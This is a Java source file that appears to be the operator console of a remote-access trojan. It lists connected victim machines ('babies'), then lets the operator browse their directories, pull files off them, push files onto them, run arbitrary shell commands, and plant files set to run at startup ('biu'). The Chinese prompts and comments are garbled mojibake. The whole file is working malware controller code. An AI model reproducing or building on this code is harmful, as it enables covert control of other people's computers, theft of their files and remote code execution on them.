package com.server;

import java.io.BufferedReader;
import java.io.BufferedWriter;
import java.io.File;
import java.io.IOException;
import java.io.InputStreamReader;
import java.util.ArrayList;

public class ConnectToClientsThread extends Thread {
	private ArrayList<Baby> babies;

	public ConnectToClientsThread(ArrayList<Baby> babies) {
		// TODO Auto-generated constructor stub

		this.babies = babies;
	}

	public void run() {
		BufferedReader inputFromKeyborad = new BufferedReader(new InputStreamReader(System.in));
		Baby baby;

		while (true) {
			System.out.println("���������ţ�������п���");
			if (babies.size() != 0) {

				for (int i = 0; i < babies.size(); i++) {
					baby = babies.get(i);
					System.out.println(i + ":" + baby.getSocket().getInetAddress());
				}
				int chooseWho;
				try {
					while (!((chooseWho = Integer.parseInt(inputFromKeyborad.readLine())) <= babies.size())
							|| chooseWho < 0) {
						System.out.println("������������⣬����������");
					}
					baby = babies.get(chooseWho);
					// ��־������ʹ��
					baby.isUsing = true;
				} catch (NumberFormatException | IOException e) {
					System.err.println("��������д����⣬����������");
					baby = null;
				}
				if (baby != null) {

					System.out.println("�Ѹ磬����ѡ��" + baby.getSocket().getInetAddress());
					System.out.println("����ѡ����������������л����Ĳ�����");
					System.out.println("	ls:չʾ��ǰ���ڵ��ļ��е�Ŀ¼��");
					System.out.println("	cd dir:���뵱ǰ�ļ�������dir��Ŀ¼ֱ����������");
					System.out.println("	down file to path:����ǰĿ¼�����file" + "�ļ����ص�������path·��");
					System.out.println("	up file to path:��������file�ļ��ϴ���" + "�ͻ��˵ĵ�ǰ·������");
					System.out.println("	cmd:�Ե�ǰ�û�����cmdָ��");
					System.out.println("	biu file to path:�ϴ��ļ���path�������俪��������");
					System.out.println("	exit:�˳��Ե�ǰ�⼦�Ĳ���");
					String temPath = "";
					ArrayList<String> files = new ArrayList<>();
					ArrayList<String> temFiles = null;
					while (true) {
						System.out.println("�Ѹ磬�����ڶ�ȡ��������");
						// ���Ŀǰ���ڹ�����Ŀ¼
						System.out.print(temPath + ":");
						// 0 û�����壬Ϊ�˱���һЩ�鷳������õ�
						String command = "0";
						try {
							command = inputFromKeyborad.readLine();
						} catch (IOException e) {
							// TODO Auto-generated catch block
							System.err.println("��ȡ����������������");
						}
						String[] commands = command.split(" ");
						String choose = commands[0];
						switch (choose) {
						case "ls": 
							if ((files != null) && !(temPath.equals(""))) {
								showFile(files);
							} else {
								System.out.println("���һ���ļ�");
							}
							break;
						

						case "cd": 
							// �����߼��Ƚϸ���,��Ҫ�����ļ��Ķ��ֿ���
							if (commands.length >= 2) {
								for (int i = 2; i < commands.length; i++) {
									commands[1] += " " + commands[i];
								}

								if ((files.contains(temPath + "/" + commands[1])) || commands[1].endsWith(":")
										|| commands[1].endsWith("/")) {
									commands[1].trim();
									// ����� cd .. ��
									if (commands[1].equals("..")) {
										int last = temPath.lastIndexOf('/');
										if (last != -1)
											temPath = temPath.substring(0, last);
										commands[1] = "";
										// ����tempath���c: d:��ʱ
										if (temPath.endsWith(":"))
											temPath += "/";
									}
									// ����� cd c:����
									if (commands[1].endsWith(":")) {
										commands[1] += "/";
										temPath = "";
									}

									// ��tempath��/��β����cd ..ʱtempath�ѱ仯
									if (temPath.endsWith("/") || commands[1].endsWith(":/") || commands[1].equals("")) {

										temFiles = getFiles(temPath + commands[1], baby);
										if (temFiles != null) {

											files = temFiles;
											// �����cd ..�Ļ� tempath �Ѿ��仯��������ǣ���
											if (!commands[1].equals("")) {
												if (temPath.equals(""))
													temPath = commands[1];
												else {
													temPath += commands[1];
												}
											}
										}
									} else {
										temFiles = getFiles(temPath + "/" + commands[1], baby);

										if (temFiles != null) {

											files = temFiles;
											// �����cd ..�Ļ� tempath �Ѿ��仯��������ǣ���
											if (!commands[1].equals(""))
												temPath += "/" + commands[1];
										}
									}

								} else {
									System.out.println("cd�����ʽ��������������");
								}
							} else {
								System.out.println("cd�����������������");
							}

							break;
						

						case "down":
							try {
								if ((commands.length == 4) && (commands[2].equals("to"))) {
									BufferedWriter writer = baby.getWriter();
									BufferedReader reader = baby.getReader();
									writer.write("server: download\r\n");
									if (temPath.endsWith("/"))
										writer.write(temPath + commands[1] + "\r\n");
									else {
										writer.write(temPath + "/" + commands[1] + "\r\n");
									}
									writer.flush();
									System.out.println("������Ӧ");
									String response = reader.readLine();
									System.out.println(response);
									if (response.equals("client: download ready")) {
										DownloadThread downloadThread = new DownloadThread(baby, temPath + commands[1],
												commands[3]);
										downloadThread.start();
									} else {
										System.out.println(response);
									}

								} else {
									System.out.println("download��ʽ��������������");
								}
							} catch (IOException e) {
								// TODO Auto-generated catch block
								System.err.println("���س��ִ���");
								e.printStackTrace();
							}
							break;
						

						case "up": 
							try {
								if ((commands.length == 4) && (commands[2].equals("to"))) {
									BufferedWriter writer = baby.getWriter();
									BufferedReader reader = baby.getReader();

									File file = new File(commands[1]);
									if (file.exists() && !file.isDirectory()) {
										writer.write("server: upload\r\n");
										writer.write(commands[3] + "\r\n");
										writer.flush();
										String response = reader.readLine();

										if (response.equals("client: upload ready")) {
											UploadThread uploadThread = new UploadThread(baby, commands[1],
													commands[3]);
											uploadThread.start();
										} else {
											System.out.println(response);
										}

									} else {
										System.out.println("�����ļ�������");
									}
								} else {
									System.out.println("upload�����ʽ����");
								}

							} catch (IOException e) {
								// TODO Auto-generated catch block
								System.err.println("�ϴ����ִ���");
								e.printStackTrace();
							}
							break;

						
						case "cmd":
							if (commands.length >= 2) {
								for (int i = 2; i < commands.length; i++) {
									commands[1] += " " + commands[i];

								}
								BufferedWriter writer = baby.getWriter();
								BufferedReader reader = baby.getReader();
								try {
									writer.write("server: cmd\r\n");
									writer.write(commands[1] + "\r\n");
									writer.flush();
									String result;
									if ((result = reader.readLine()).equals("cmd is running")) {
										result = "";
										String buf = "";
										while (!(buf = reader.readLine()).equals("this command is over")) {
											result += buf + "\r\n";

										}
										System.out.println("result :");
										System.out.println(result);

									} else {
										System.out.println(result);
									}
								} catch (IOException e) {
									// TODO Auto-generated catch block
									System.out.println("����ԭ���ڷ�����");
								}

							} else {
								System.out.println("�����ʽ����");
							}
							break;
							
						case "biu":
							try {
								if ((commands.length == 4) && (commands[2].equals("to"))) {
									BufferedWriter writer = baby.getWriter();
									BufferedReader reader = baby.getReader();

									File file = new File(commands[1]);
									if (file.exists() && !file.isDirectory()) {
										writer.write("server: biu\r\n");
										writer.write(commands[3] + "\r\n");
										writer.flush();
										String response = reader.readLine();

										if (response.equals("client: upload ready")) {
											UploadThread uploadThread = new UploadThread(baby, commands[1],
													commands[3]);
											uploadThread.start();
										} else {
											System.out.println(response);
										}

									} else {
										System.out.println("�����ļ�������");
									}
								} else {
									System.out.println("upload�����ʽ����");
								}

							} catch (IOException e) {
								// TODO Auto-generated catch block
								System.err.println("�ϴ����ִ���");
								e.printStackTrace();
							}
							break;

						default:
							System.out.println("�����ʽ��������������");

						}
						if (choose.equals("exit")) {
							System.out.println("�˳���");
							// ��־�Ѿ�����ʹ��
							baby.isUsing = false;
							baby = null;
							break;
						}

					}

				}

			} else {
				System.out.println("��û���⼦����,�����������ɨ��");
				try {
					inputFromKeyborad.readLine();
				} catch (IOException e) {
					// TODO Auto-generated catch block
					e.printStackTrace();
				}

			}
		}

	}

	public ArrayList<String> getFiles(String path, Baby baby) {
		ArrayList<String> files = new ArrayList<>();
		try {
			BufferedReader reader = baby.getReader();
			BufferedWriter writer = baby.getWriter();
			writer.write("server: getFiles\r\n");
			writer.write(path + "\r\n");
			writer.flush();
			String response = reader.readLine();
			if (response.equals("client: get dir ready")) {
				while (!(response = reader.readLine()).equals("client: end")) {
					files.add(response);
				}
				files.add(path + "/" + "..");
				return files;
			} else {
				System.out.println(response);
				return null;
			}
		} catch (IOException e) {
			// TODO Auto-generated catch block
			System.out.println("����δ֪����");
			e.printStackTrace();
			return null;
		}
	}

	public void showFile(ArrayList<String> files) {

		for (String file : files) {
			System.out.println(file);
		}

	}

}
